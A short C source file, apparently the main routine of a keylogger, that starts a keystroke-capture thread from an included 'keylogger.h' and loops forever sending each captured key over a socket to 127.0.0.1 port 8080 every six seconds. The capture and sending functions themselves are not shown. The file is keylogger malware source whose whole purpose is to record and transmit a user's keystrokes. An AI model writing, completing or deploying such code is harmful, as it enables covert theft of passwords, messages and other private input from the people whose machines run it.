#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include "keylogger.h"
#include "send_keylog.h"

int main() {
    char key[20];
    queue* q = init_queue();
    pthread_t thread = start_keylog_thread(q);
    int sock = create_conn("127.0.0.1", 8080);

    while (1) {
        while (get_keylog(q, key)) {
            send_keylog(sock, key);
        }

        sleep(6); // Sleep for 6 seconds
    }

    close_socket(sock);
    return 0;
}

